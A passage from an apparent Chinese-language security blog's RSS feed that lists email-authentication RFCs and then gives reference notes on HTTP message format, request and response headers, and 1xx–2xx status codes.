&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ0MDg=&#34;&gt;RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYzNzY=&#34;&gt;RFC 6376 DomainKeys Identified Mail (DKIM) Signatures&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMDg=&#34;&gt;RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODk=&#34;&gt;RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgzMDE=&#34;&gt;RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0NjM=&#34;&gt;RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg2MTY=&#34;&gt;RFC 8616 Email Authentication for Internationalized Mail&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg2MTE=&#34;&gt;RFC 8611 Mail&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;相关文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关文档&#34;&gt;#&lt;/a&gt; 相关文档&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2VuZGVyX1BvbGljeV9GcmFtZXdvcms=&#34;&gt;Sender Policy Framework wikipedia&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRG9tYWluS2V5c19JZGVudGlmaWVkX01haWw=&#34;&gt;DomainKeys Identified Mail wikipedia&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRE1BUkM=&#34;&gt;DMARC wikipedia&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;研究文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#研究文章&#34;&gt;#&lt;/a&gt; 研究文章&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9UaHVyc2RheS91cy0yMC1DaGVuLVlvdS1IYXZlLU5vLUlkZWEtV2hvLVNlbnQtVGhhdC1FbWFpbC0xOC1BdHRhY2tzLU9uLUVtYWlsLVNlbmRlci1BdXRoZW50aWNhdGlvbi13cC5wZGY=&#34;&gt;Composition Kills:A Case Study of Email Sender Authentication&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/HTTP/</guid>
            <title>HTTP协议簇</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/HTTP/</link>
            <category>HTTP</category>
            <pubDate>Fri, 25 Nov 2022 11:05:41 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;http标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http标准&#34;&gt;#&lt;/a&gt; HTTP 标准&lt;/h1&gt;
&lt;h2 id=&#34;报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报文格式&#34;&gt;#&lt;/a&gt; 报文格式&lt;/h2&gt;
&lt;h3 id=&#34;请求报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求报文格式&#34;&gt;#&lt;/a&gt; 请求报文格式&lt;/h3&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;method&gt;&amp;lt;request-URL&gt;&amp;lt;version&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;headers&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;entity-body&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;响应报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#响应报文格式&#34;&gt;#&lt;/a&gt; 响应报文格式&lt;/h3&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;version&gt;&amp;lt;status&gt;&amp;lt;reason-phrase&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;headers&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;entity-body&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;字段解释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字段解释&#34;&gt;#&lt;/a&gt; 字段解释&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;method
&lt;ul&gt;
&lt;li&gt;HTTP 动词&lt;/li&gt;
&lt;li&gt;常见方法：HEAD / GET / POST / PUT / DELETE / PATCH / OPTIONS / TRACE&lt;/li&gt;
&lt;li&gt;扩展方法：LOCK / MKCOL / COPY / MOVE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;报文使用的 HTTP 版本&lt;/li&gt;
&lt;li&gt;格式为 HTTP/&amp;lt;major&amp;gt;.&amp;lt;minor&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;url
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;scheme&amp;gt;://&amp;lt;user&amp;gt;:&amp;lt;password&amp;gt;@&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;path&amp;gt;;&amp;lt;params&amp;gt;?&amp;lt;query&amp;gt;#&amp;lt;frag&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;请求头列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求头列表&#34;&gt;#&lt;/a&gt; 请求头列表&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Accept
&lt;ul&gt;
&lt;li&gt;指定客户端能够接收的内容类型&lt;/li&gt;
&lt;li&gt;Accept: text/plain, text/html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Accept-Charset
&lt;ul&gt;
&lt;li&gt;浏览器可以接受的字符编码集&lt;/li&gt;
&lt;li&gt;Accept-Charset: iso-8859-5&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Accept-Encoding
&lt;ul&gt;
&lt;li&gt;指定浏览器可以支持的 web 服务器返回内容压缩编码类型&lt;/li&gt;
&lt;li&gt;Accept-Encoding: compress, gzip&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Accept-Language
&lt;ul&gt;
&lt;li&gt;浏览器可接受的语言&lt;/li&gt;
&lt;li&gt;Accept-Language: en,zh&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Accept-Ranges
&lt;ul&gt;
&lt;li&gt;可以请求网页实体的一个或者多个子范围字段&lt;/li&gt;
&lt;li&gt;Accept-Ranges: bytes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Authorization
&lt;ul&gt;
&lt;li&gt;HTTP 授权的授权证书&lt;/li&gt;
&lt;li&gt;Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache-Control
&lt;ul&gt;
&lt;li&gt;指定请求和响应遵循的缓存机制 Cache-Control: no-cache&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Connection
&lt;ul&gt;
&lt;li&gt;表示是否需要持久连接 // HTTP 1.1 默认进行持久连接&lt;/li&gt;
&lt;li&gt;Connection: close&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cookie
&lt;ul&gt;
&lt;li&gt;HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器&lt;/li&gt;
&lt;li&gt;Cookie: role=admin;ssid=1&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Length
&lt;ul&gt;
&lt;li&gt;请求的内容长度&lt;/li&gt;
&lt;li&gt;Content-Length: 348&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Type
&lt;ul&gt;
&lt;li&gt;请求的与实体对应的 MIME 信息&lt;/li&gt;
&lt;li&gt;Content-Type: application/x-www-form-urlencoded&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Date
&lt;ul&gt;
&lt;li&gt;请求发送的日期和时间&lt;/li&gt;
&lt;li&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Expect
&lt;ul&gt;
&lt;li&gt;请求的特定的服务器行为&lt;/li&gt;
&lt;li&gt;Expect: 100-continue&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;From
&lt;ul&gt;
&lt;li&gt;发出请求的用户的&lt;/li&gt;
&lt;li&gt;EmailFrom: &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnVzZXJAZW1haWwuY29t&#34;&gt;user@email.com&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Host
&lt;ul&gt;
&lt;li&gt;指定请求的服务器的域名和端口号&lt;/li&gt;
&lt;li&gt;Host: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5naXRodWIuY29t&#34;&gt;www.github.com&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If-Match
&lt;ul&gt;
&lt;li&gt;只有请求内容与实体相匹配才有效&lt;/li&gt;
&lt;li&gt;If-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If-Modified-Since
&lt;ul&gt;
&lt;li&gt;如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码&lt;/li&gt;
&lt;li&gt;If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If-None-Match
&lt;ul&gt;
&lt;li&gt;如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变&lt;/li&gt;
&lt;li&gt;If-None-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If-Range
&lt;ul&gt;
&lt;li&gt;如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag&lt;/li&gt;
&lt;li&gt;If-Range: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If-Unmodified-Since
&lt;ul&gt;
&lt;li&gt;只在实体在指定时间之后未被修改才请求成功&lt;/li&gt;
&lt;li&gt;If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Max-Forwards
&lt;ul&gt;
&lt;li&gt;限制信息通过代理和网关传送的时间&lt;/li&gt;
&lt;li&gt;Max-Forwards: 10&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pragma
&lt;ul&gt;
&lt;li&gt;用来包含实现特定的指令&lt;/li&gt;
&lt;li&gt;Pragma: no-cache&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proxy-Authorization
&lt;ul&gt;
&lt;li&gt;连接到代理的授权证书&lt;/li&gt;
&lt;li&gt;Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Range
&lt;ul&gt;
&lt;li&gt;只请求实体的一部分，指定范围&lt;/li&gt;
&lt;li&gt;Range: bytes=500-999&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Referer
&lt;ul&gt;
&lt;li&gt;先前网页的地址，当前请求网页紧随其后，即来路&lt;/li&gt;
&lt;li&gt;Referer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/71.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TE
&lt;ul&gt;
&lt;li&gt;客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息&lt;/li&gt;
&lt;li&gt;TE: trailers,deflate;q=0.5&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Upgrade
&lt;ul&gt;
&lt;li&gt;向服务器指定某种传输协议以便服务器进行转换（如果支持）&lt;/li&gt;
&lt;li&gt;Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User-Agent
&lt;ul&gt;
&lt;li&gt;User-Agent 的内容包含发出请求的用户信息&lt;/li&gt;
&lt;li&gt;User-Agent: Mozilla/5.0 (Linux; X11)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Via
&lt;ul&gt;
&lt;li&gt;通知中间网关或代理服务器地址，通信协议&lt;/li&gt;
&lt;li&gt;Via: 1.0 fred, 1.1 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25vd2hlcmUuY29t&#34;&gt;nowhere.com&lt;/span&gt; (Apache/1.1)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Warning
&lt;ul&gt;
&lt;li&gt;关于消息实体的警告信息&lt;/li&gt;
&lt;li&gt;Warn: 199 Miscellaneous warning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;响应头列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#响应头列表&#34;&gt;#&lt;/a&gt; 响应头列表&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Accept-Ranges
&lt;ul&gt;
&lt;li&gt;表明服务器是否支持指定范围请求及哪种类型的分段请求&lt;/li&gt;
&lt;li&gt;Accept-Ranges: bytes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Origin
&lt;ul&gt;
&lt;li&gt;配置有权限访问资源的域&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Origin: &amp;lt;origin&amp;gt;|*&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Age
&lt;ul&gt;
&lt;li&gt;从原始服务器到代理缓存形成的估算时间（以秒计，非负）&lt;/li&gt;
&lt;li&gt;Age: 12&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Allow
&lt;ul&gt;
&lt;li&gt;对某网络资源的有效的请求行为，不允许则返回 405&lt;/li&gt;
&lt;li&gt;Allow: GET, HEAD&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache-Control
&lt;ul&gt;
&lt;li&gt;告诉所有的缓存机制是否可以缓存及哪种类型&lt;/li&gt;
&lt;li&gt;Cache-Control: no-cache&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Encoding
&lt;ul&gt;
&lt;li&gt;web 服务器支持的返回内容压缩编码类型&lt;/li&gt;
&lt;li&gt;Content-Encoding: gzip&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Language
&lt;ul&gt;
&lt;li&gt;响应体的语言&lt;/li&gt;
&lt;li&gt;Content-Language: en,zh&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Length
&lt;ul&gt;
&lt;li&gt;响应体的长度&lt;/li&gt;
&lt;li&gt;Content-Length: 348&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Location
&lt;ul&gt;
&lt;li&gt;请求资源可替代的备用的另一地址&lt;/li&gt;
&lt;li&gt;Content-Location: /index.htm&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-MD5
&lt;ul&gt;
&lt;li&gt;返回资源的 MD5 校验值&lt;/li&gt;
&lt;li&gt;Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Range
&lt;ul&gt;
&lt;li&gt;在整个返回体中本部分的字节位置&lt;/li&gt;
&lt;li&gt;Content-Range: bytes 21010-47021/47022&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-Type
&lt;ul&gt;
&lt;li&gt;返回内容的 MIME 类型&lt;/li&gt;
&lt;li&gt;Content-Type: text/html; charset=utf-8&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Date
&lt;ul&gt;
&lt;li&gt;原始服务器消息发出的时间&lt;/li&gt;
&lt;li&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ETag
&lt;ul&gt;
&lt;li&gt;请求变量的实体标签的当前值&lt;/li&gt;
&lt;li&gt;ETag: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Expires
&lt;ul&gt;
&lt;li&gt;响应过期的日期和时间&lt;/li&gt;
&lt;li&gt;Expires: Thu, 01 Dec 2010 16:00:00 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Last-Modified
&lt;ul&gt;
&lt;li&gt;请求资源的最后修改时间&lt;/li&gt;
&lt;li&gt;Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Location
&lt;ul&gt;
&lt;li&gt;用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源&lt;/li&gt;
&lt;li&gt;Location: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/94.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pragma
&lt;ul&gt;
&lt;li&gt;包括实现特定的指令，它可应用到响应链上的任何接收方&lt;/li&gt;
&lt;li&gt;Pragma: no-cache&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proxy-Authenticate
&lt;ul&gt;
&lt;li&gt;它指出认证方案和可应用到代理的该 URL 上的参数&lt;/li&gt;
&lt;li&gt;Proxy-Authenticate: Basic&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Refresh
&lt;ul&gt;
&lt;li&gt;应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）&lt;/li&gt;
&lt;li&gt;Refresh: 5; url=http://www.zcmhi.com/archives/94.html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Retry-After
&lt;ul&gt;
&lt;li&gt;如果实体暂时不可取，通知客户端在指定时间之后再次尝试&lt;/li&gt;
&lt;li&gt;Retry-After: 120&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server
&lt;ul&gt;
&lt;li&gt;web 服务器软件名称&lt;/li&gt;
&lt;li&gt;Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Set-Cookie
&lt;ul&gt;
&lt;li&gt;设置 Http Cookie&lt;/li&gt;
&lt;li&gt;Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Strict-Transport-Security
&lt;ul&gt;
&lt;li&gt;设置浏览器强制使用 HTTPS 访问&lt;/li&gt;
&lt;li&gt;max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求&lt;/li&gt;
&lt;li&gt;includeSubDomains: 网站的子域名也启用规则&lt;/li&gt;
&lt;li&gt;Strict-Transport-Security: max-age=1000; includeSubDomains&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trailer
&lt;ul&gt;
&lt;li&gt;指出头域在分块传输编码的尾部存在&lt;/li&gt;
&lt;li&gt;Trailer: Max-Forwards&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transfer-Encoding
&lt;ul&gt;
&lt;li&gt;文件传输编码&lt;/li&gt;
&lt;li&gt;Transfer-Encoding:chunked&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Vary
&lt;ul&gt;
&lt;li&gt;告诉下游代理是使用缓存响应还是从原始服务器请求&lt;/li&gt;
&lt;li&gt;Vary: *&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Via
&lt;ul&gt;
&lt;li&gt;告知代理客户端响应是通过哪里发送的&lt;/li&gt;
&lt;li&gt;Via: 1.0 fred, 1.1 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25vd2hlcmUuY29t&#34;&gt;nowhere.com&lt;/span&gt; (Apache/1.1)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Warning
&lt;ul&gt;
&lt;li&gt;警告实体可能存在的问题&lt;/li&gt;
&lt;li&gt;Warning: 199 Miscellaneous warning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;WWW-Authenticate
&lt;ul&gt;
&lt;li&gt;表明客户端请求实体应该使用的授权方案&lt;/li&gt;
&lt;li&gt;WWW-Authenticate: Basic&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;X-Content-Type-Options
&lt;ul&gt;
&lt;li&gt;配置禁止 MIME 类型嗅探&lt;/li&gt;
&lt;li&gt;X-Content-Type-Options: nosniff&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;X-Frame-Options
&lt;ul&gt;
&lt;li&gt;配置页面是否能出现在 &amp;lt;frame&amp;gt;, &amp;lt;iframe&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;object&amp;gt; 等标签中，防止点击劫持&lt;/li&gt;
&lt;li&gt;X-Frame-Options: deny&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;X-XSS-Protection
&lt;ul&gt;
&lt;li&gt;配置 XSS 防护机制&lt;/li&gt;
&lt;li&gt;X-XSS-Protection: 1; mode=block&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;http状态返回代码-1xx临时响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http状态返回代码-1xx临时响应&#34;&gt;#&lt;/a&gt; HTTP 状态返回代码 1xx（临时响应）&lt;/h2&gt;
&lt;p&gt;表示临时响应并需要请求者继续执行操作的状态代码。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;th&gt;代码&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;继续&lt;/td&gt;
&lt;td&gt;服务器返回此代码表示已收到请求的第一部分，正在等待其余部分&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;切换协议&lt;/td&gt;
&lt;td&gt;请求者已要求服务器切换协议，服务器已确认并准备切换&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;http状态返回代码-2xx-成功&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http状态返回代码-2xx-成功&#34;&gt;#&lt;/a&gt; HTTP 状态返回代码 2xx （成功）&lt;/h2&gt;
&lt;p&gt;表示成功处理了请求的状态代码。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Code&lt;/th&gt;
&lt;th&gt;代码&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;成功&lt;/td&gt;
&lt;td&gt;服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;201&lt;/td&gt;
&lt;td&gt;已创建&lt;/td&gt;
&lt;td&gt;请求成功并且服务器创建了新的资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;202&lt;/td&gt;
&lt;td&gt;已接受&lt;/td&gt;
&lt;td&gt;服务器已接受请求，但尚未处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;203&lt;/td&gt;
&lt;td&gt;非授权信息&lt;/td&gt;
&lt;td&gt;服务器已成功处理了请求，但返回的信息可能来自另一来源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;204&lt;/td&gt;
&lt;td&gt;无内容&lt;/td&gt;
&lt;td&gt;服务器成功处理了请求，但没有返回任何内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;205&lt;/td&gt;
&lt;td&gt;重置内容&lt;/td&gt;
&lt;td&gt;m 服务器成功处理了请求，但没有返回任何内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;206&lt;/td&gt;
&lt;td&gt;部分内容&lt;/td&gt;
&lt;td&gt;服务器成功处理了部分 GET 请求&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
